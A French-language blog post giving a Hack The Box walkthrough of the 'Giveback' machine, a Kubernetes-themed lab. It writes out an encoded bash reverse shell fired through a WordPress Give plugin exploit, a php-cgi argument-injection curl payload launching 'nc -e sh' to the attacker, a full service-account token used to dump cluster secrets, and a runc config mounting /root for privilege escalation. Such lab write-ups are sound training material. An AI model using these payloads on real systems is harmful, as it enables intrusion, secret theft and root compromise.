+++
date = '2025-11-07T16:30:37+01:00'
draft = true
title = 'Giveback'
+++

![Photo de la box](box-picture.png)

Giveback est une box linux, sortie sur hack the box le 1er novembre 2025, créée par [babywyrm](https://github.com/babywyrm).  
Elle a pour thème un cluster kubernetes, et utilise comme techniques l'exploit de différentes CVE, le pivot entre différents containers et l'abus d'un binaire privilégié.

# User.txt

## Foothold

(Résultat du nmap)

En regardant le site sur le port 80, on voit que c'est un site wordpress.
Avec wpscan, on découvre que le site utilise le plugin Give qui est vulnérable à la CVE-2024-8353, permettant d'éxécuter du code à distance.  

La CVE en question est due à un problème de désérialisation PHP. Pour plus d'explications sur l'exploit :  
- [https://github.com/EQSTLab/CVE-2024-8353](https://github.com/EQSTLab/CVE-2024-8353)
- [Intro to PHP deserialization / Object Injection by Ippsec](https://youtube.com/watch?v=HaW15aMzBUM&t=1200)

---

On exploit en lançant un reverse shell et on atterit sur le premier container.

```sh
python CVE-2024-8353.py -u http://giveback.htb -c 'echo "c2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTYuMzEvNDQ0NCAwPiYx#" | base64 -d | bash'
```

## Sur la box

Sur le premier container, qui host le site wordpress, on trouve un fichier wp-config.php, avec des credentials pour se connecter à mariadb.

```
WORDPRESS_DATABASE_NAME=bitnami_wordpress
WORDPRESS_DATABASE_USER=bn_wordpress
WORDPRESS_DATABASE_PASSWORD=[REDACTED]
WORDPRESS_DATABASE_HOST=beta-vino-wp-mariadb:3306
```

Dans la db, on trouve un hash pour l'utilisateur babywyrm.  
Le hash n'est pas crackable, donc on le note et on passe à autre chose. On note aussi le password trouvé dans le fichier de config.

---

Après un tour plus élaboré, on trouve dans les variables d'environnement deux autres IP joignables :

```
LEGACY_INTRANET_SERVICE_SERVICE_HOST=10.43.2.241
LEGACY_INTRANET_SERVICE_SERVICE_PORT=5000
KUBERNETES_PORT=tcp://10.43.0.1:443
```

## Pivot

A partir de là, on peut continuer la box sans pivoter, néanmoins je considère ça toujours comme un plus.    

On pivote avec ligolo-ng.  
Pour expliquer simplement, ligolo nous permet de rediriger le trafic réseau d’un système vers le notre.  
Cela nous permet donc d'accéder aux ip de l'intranet et du service kubernetes depuis notre machine, histoire de simplifier le tout.

--- 

On importe l'agent ligolo sur la box:  
```sh
php -r "echo file_get_contents('http://$MON_IP:8000/agent');" > agent
```

On crée une interface ligolo dans ma machine:  
```sh
ligolo-ng -selfcert
```

Et dans ligolo:  
```
interface_create --name "ligolo"
```

--- 

Sur la box, on fait
```sh
./agent -connect $MON_IP:11601 -ignore-cert
```

---

Sur mon ligolo
```
tunnel_start --tun ligolo
interface_add_route --name ligolo --route 10.43.0.0/16
```

## Joindre le deuxieme container

Le site sur le port 5000 de cette ip est un site php utilisant php-cgi (on le voit car l'index.php du site nous le dit). Il est vulnérable à la CVE-2024-4577, qui permet de RCE. On utilise le repot suivant pour l'exploit : https://github.com/watchtowrlabs/CVE-2024-4577.

pour revshell:
```sh
curl -X POST 'http://10.43.2.241:5000/cgi-bin/php-cgi?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -d 'nc 10.10.16.31 2222 -e sh'
```

## Secrets K8

Sur le container, on trouve des secrets kubernetes.

ca.crt
```
-----BEGIN CERTIFICATE-----
MIIBdzCCAR2gAwIBAgIBADAKBggqhkjOPQQDAjAjMSEwHwYDVQQDDBhrM3Mtc2Vy
dmVyLWNhQDE3MjY5Mjc3MjMwHhcNMjQwOTIxMTQwODQzWhcNMzQwOTE5MTQwODQz
WjAjMSEwHwYDVQQDDBhrM3Mtc2VydmVyLWNhQDE3MjY5Mjc3MjMwWTATBgcqhkjO
PQIBBggqhkjOPQMBBwNCAATWYWOnIUmDn8DGHOdKLjrOZ36gSUMVrnqqf6YJsvpk
9QbgzGNFzYcwDZxmZtJayTbUrFFjgSydDNGuW/AkEnQ+o0IwQDAOBgNVHQ8BAf8E
BAMCAqQwDwYDVR0TAQH/BAUwAwEB/zAdBgNVHQ4EFgQUtCpVDbK3XnBv3N3BKuXy
Yd0zeicwCgYIKoZIzj0EAwIDSAAwRQIgOsFo4UipeXPiEXvlGH06fja8k46ytB45
cd0d39uShuQCIQDMgaSW8nrpMfNExuGLMZhcsVrUr5XXN8F5b/zYi5snkQ==
-----END CERTIFICATE-----
```

token
```
eyJhbGciOiJSUzI1NiIsImtpZCI6Inp3THEyYUhkb19sV3VBcGFfdTBQa1c1S041TkNiRXpYRS11S0JqMlJYWjAifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiLCJrM3MiXSwiZXhwIjoxNzkzNjQ0NTg3LCJpYXQiOjE3NjIxMDg1ODcsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwianRpIjoiYjc0ODRjM2UtNGZkYS00OWE4LTkwMDctOWE1NTAyNGI5NDAyIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJkZWZhdWx0Iiwibm9kZSI6eyJuYW1lIjoiZ2l2ZWJhY2suaHRiIiwidWlkIjoiMTJhOGE5Y2YtYzM1Yi00MWYzLWIzNWEtNDJjMjYyZTQzMDQ2In0sInBvZCI6eyJuYW1lIjoibGVnYWN5LWludHJhbmV0LWNtcy02ZjdiZjVkYjg0LWptNmJ6IiwidWlkIjoiYjg0NGI4MDctMGIyMS00NWQ1LWJhNmYtODIxZmM1ZTFlN2RkIn0sInNlcnZpY2VhY2NvdW50Ijp7Im5hbWUiOiJzZWNyZXQtcmVhZGVyLXNhIiwidWlkIjoiNzJjM2YwYTUtOWIwOC00MzhhLWEzMDctYjYwODc0NjM1YTlhIn0sIndhcm5hZnRlciI6MTc2MjExMjE5NH0sIm5iZiI6MTc2MjEwODU4Nywic3ViIjoic3lzdGVtOnNlcnZpY2VhY2NvdW50OmRlZmF1bHQ6c2VjcmV0LXJlYWRlci1zYSJ9.hsMjnPCJP97sTpQHsD1yKWjIhHxn3YcoJrpRM6qhS4lN3q0uXWchv2HR5QoRqxUptu9lFw_kZmPz0NSZ85eCWbdD34dwUBPgj7HL0_CFwoXFiTi1GxHYbS0Rs0e_5oQg2nTNDqvJ6kd9pui7XRthKhmh-xpY4Y3Vlu1OZ8Eyo9zRv_kPKRQuK3Lv9EaEoyWwsu9FrA7OopMceA-TLvfpmvtyNrVpbsqsXNe3Kzz0-Wpy1L4H6LdxtpjLWWrVMS0vWKKG-aVHeE-m64F1GEb9FSDhpyqnzlWRDlY8zvv8ru35U-PXISmRBA1ukv-dMV6Y_z84JUknOnf7dsnhzBiVVQ
```

namespace
```
default
```

## Connexion au serv k8

On se connecte avec nos creds et on regarde les secrets

```sh
curl -v --cacert file.crt \
  -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsImtpZCI6Inp3THEyYUhkb19sV3VBcGFfdTBQa1c1S041TkNiRXpYRS11S0JqMlJYWjAifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiLCJrM3MiXSwiZXhwIjoxNzkzNjQ0NTg3LCJpYXQiOjE3NjIxMDg1ODcsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwianRpIjoiYjc0ODRjM2UtNGZkYS00OWE4LTkwMDctOWE1NTAyNGI5NDAyIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJkZWZhdWx0Iiwibm9kZSI6eyJuYW1lIjoiZ2l2ZWJhY2suaHRiIiwidWlkIjoiMTJhOGE5Y2YtYzM1Yi00MWYzLWIzNWEtNDJjMjYyZTQzMDQ2In0sInBvZCI6eyJuYW1lIjoibGVnYWN5LWludHJhbmV0LWNtcy02ZjdiZjVkYjg0LWptNmJ6IiwidWlkIjoiYjg0NGI4MDctMGIyMS00NWQ1LWJhNmYtODIxZmM1ZTFlN2RkIn0sInNlcnZpY2VhY2NvdW50Ijp7Im5hbWUiOiJzZWNyZXQtcmVhZGVyLXNhIiwidWlkIjoiNzJjM2YwYTUtOWIwOC00MzhhLWEzMDctYjYwODc0NjM1YTlhIn0sIndhcm5hZnRlciI6MTc2MjExMjE5NH0sIm5iZiI6MTc2MjEwODU4Nywic3ViIjoic3lzdGVtOnNlcnZpY2VhY2NvdW50OmRlZmF1bHQ6c2VjcmV0LXJlYWRlci1zYSJ9.hsMjnPCJP97sTpQHsD1yKWjIhHxn3YcoJrpRM6qhS4lN3q0uXWchv2HR5QoRqxUptu9lFw_kZmPz0NSZ85eCWbdD34dwUBPgj7HL0_CFwoXFiTi1GxHYbS0Rs0e_5oQg2nTNDqvJ6kd9pui7XRthKhmh-xpY4Y3Vlu1OZ8Eyo9zRv_kPKRQuK3Lv9EaEoyWwsu9FrA7OopMceA-TLvfpmvtyNrVpbsqsXNe3Kzz0-Wpy1L4H6LdxtpjLWWrVMS0vWKKG-aVHeE-m64F1GEb9FSDhpyqnzlWRDlY8zvv8ru35U-PXISmRBA1ukv-dMV6Y_z84JUknOnf7dsnhzBiVVQ" \
  -H "Accept: application/json" \
  "https://10.43.0.1/api/v1/namespaces/default/secrets"
```

Pour avoir uniquement le secret de babywyrm:

```sh
curl -v --cacert file.crt \
  -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsImtpZCI6Inp3THEyYUhkb19sV3VBcGFfdTBQa1c1S041TkNiRXpYRS11S0JqMlJYWjAifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiLCJrM3MiXSwiZXhwIjoxNzkzNjQ0NTg3LCJpYXQiOjE3NjIxMDg1ODcsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwianRpIjoiYjc0ODRjM2UtNGZkYS00OWE4LTkwMDctOWE1NTAyNGI5NDAyIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJkZWZhdWx0Iiwibm9kZSI6eyJuYW1lIjoiZ2l2ZWJhY2suaHRiIiwidWlkIjoiMTJhOGE5Y2YtYzM1Yi00MWYzLWIzNWEtNDJjMjYyZTQzMDQ2In0sInBvZCI6eyJuYW1lIjoibGVnYWN5LWludHJhbmV0LWNtcy02ZjdiZjVkYjg0LWptNmJ6IiwidWlkIjoiYjg0NGI4MDctMGIyMS00NWQ1LWJhNmYtODIxZmM1ZTFlN2RkIn0sInNlcnZpY2VhY2NvdW50Ijp7Im5hbWUiOiJzZWNyZXQtcmVhZGVyLXNhIiwidWlkIjoiNzJjM2YwYTUtOWIwOC00MzhhLWEzMDctYjYwODc0NjM1YTlhIn0sIndhcm5hZnRlciI6MTc2MjExMjE5NH0sIm5iZiI6MTc2MjEwODU4Nywic3ViIjoic3lzdGVtOnNlcnZpY2VhY2NvdW50OmRlZmF1bHQ6c2VjcmV0LXJlYWRlci1zYSJ9.hsMjnPCJP97sTpQHsD1yKWjIhHxn3YcoJrpRM6qhS4lN3q0uXWchv2HR5QoRqxUptu9lFw_kZmPz0NSZ85eCWbdD34dwUBPgj7HL0_CFwoXFiTi1GxHYbS0Rs0e_5oQg2nTNDqvJ6kd9pui7XRthKhmh-xpY4Y3Vlu1OZ8Eyo9zRv_kPKRQuK3Lv9EaEoyWwsu9FrA7OopMceA-TLvfpmvtyNrVpbsqsXNe3Kzz0-Wpy1L4H6LdxtpjLWWrVMS0vWKKG-aVHeE-m64F1GEb9FSDhpyqnzlWRDlY8zvv8ru35U-PXISmRBA1ukv-dMV6Y_z84JUknOnf7dsnhzBiVVQ" \
  -H "Accept: application/json" \
  "https://10.43.0.1/api/v1/namespaces/default/secrets/user-secret-babywyrm"
```

On obtient son token, qu'on decode en base 64 et qui est son password pour ssh.

```sh
$ cat user.txt
[REDACTED]
```

# Root.txt

En arrivant sur la box, on voit avec `sudo -l` qu'on peut run le binaire /opt/debug avec les permissions sudo.  

Cette partie est la partie qui a donné une mauvaise note à la box, puisqu'elle est extrêmement guessy.  
En effet, en lançant /opt/debug avec sudo, on nous demande un mot de passe administrateur.

Vous vous souvenez des credentials du début, trouvés dans le fichier wp-config.php ? Et bien c'est pas ça.  
C'est les credentials du début, trouvés dans le fichier wp-config.php, ENCODE en base64.  
C'est trouvable au bout d'un moment par logique, mais vraiment weird.

---

/opt/debug lance en réalité le binaire runc, un gérant de containeurs.  
Pas mal de privesc sont possibles, j'ai personnellement mount le /root dans mon container.

(ajouter le tar.tgz)

```sh
sudo /opt/debug spec		#génère un fichier de config
```

```config.json
{
	"ociVersion": "1.0.2-dev",
	"process": {
		"terminal": false,
		"user": {
			"uid": 0,
			"gid": 0
		},
		"args": [
			"sh",
			"-c",
			"while :; do date; sleep 1; done"
		],
		"env": [
			"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin",
			"TERM=xterm"
		],
		"cwd": "/",
		"capabilities": {
			"bounding": [
				"CAP_AUDIT_WRITE",
				"CAP_KILL",
				"CAP_NET_BIND_SERVICE"
			],
			"effective": [
				"CAP_AUDIT_WRITE",
				"CAP_KILL",
				"CAP_NET_BIND_SERVICE"
			],
			"permitted": [
				"CAP_AUDIT_WRITE",
				"CAP_KILL",
				"CAP_NET_BIND_SERVICE"
			],
			"ambient": [
				"CAP_AUDIT_WRITE",
				"CAP_KILL",
				"CAP_NET_BIND_SERVICE"
			]
		},
		"rlimits": [
			{
				"type": "RLIMIT_NOFILE",
				"hard": 1024,
				"soft": 1024
			}
		],
		"noNewPrivileges": true
	},
	"root": {
		"path": "rootfs",
		"readonly": true
	},
	"hostname": "runc",
	"mounts": [
		{
			"destination": "/proc",
			"type": "proc",
			"source": "proc"
		},
		{
			"destination": "/dev",
			"type": "tmpfs",
			"source": "tmpfs",
			"options": [
				"nosuid",
				"strictatime",
				"mode=755",
				"size=65536k"
			]
		},
		{
			"destination": "/dev/pts",
			"type": "devpts",
			"source": "devpts",
			"options": [
				"nosuid",
				"noexec",
				"newinstance",
				"ptmxmode=0666",
				"mode=0620",
				"gid=5"
			]
		},
		{
			"destination": "/dev/shm",
			"type": "tmpfs",
			"source": "shm",
			"options": [
				"nosuid",
				"noexec",
				"nodev",
				"mode=1777",
				"size=65536k"
			]
		},
		{
			"destination": "/dev/mqueue",
			"type": "mqueue",
			"source": "mqueue",
			"options": [
				"nosuid",
				"noexec",
				"nodev"
			]
		},
		{
			"destination": "/sys",
			"type": "sysfs",
			"source": "sysfs",
			"options": [
				"nosuid",
				"noexec",
				"nodev",
				"ro"
			]
		},
		{
			"destination": "/sys/fs/cgroup",
			"type": "cgroup",
			"source": "cgroup",
			"options": [
				"nosuid",
				"noexec",
				"nodev",
				"relatime",
				"ro"
			]
		},
		{
			"type": "bind",
    			"source": "/root",
    			"destination": "/my-root",
    			"options": [
        			"rbind",
        			"rw"
    			]
		}
	],
	"linux": {
		"resources": {
			"devices": [
				{
					"allow": false,
					"access": "rwm"
				}
			]
		},
		"namespaces": [
			{
				"type": "pid"
			},
			{
				"type": "network"
			},
			{
				"type": "ipc"
			},
			{
				"type": "uts"
			},
			{
				"type": "mount"
			},
			{
				"type": "cgroup"
			}
		],
		"maskedPaths": [
			"/proc/acpi",
			"/proc/asound",
			"/proc/kcore",
			"/proc/keys",
			"/proc/latency_stats",
			"/proc/timer_list",
			"/proc/timer_stats",
			"/proc/sched_debug",
			"/sys/firmware",
			"/proc/scsi"
		],
		"readonlyPaths": [
			"/proc/bus",
			"/proc/fs",
			"/proc/irq",
			"/proc/sys",
			"/proc/sysrq-trigger"
		]
	}
}
```

```sh
sudo /opt/debug run mon-container
```

Sur un autre terminal

```sh
sudo /opt/debug exec mon-container sh

$ cat /my-root/root.txt
[REDACTED]
```

Et c'est la fin de la room. Merci d'avoir suivi !

![Machine Pwned !](pwned.png)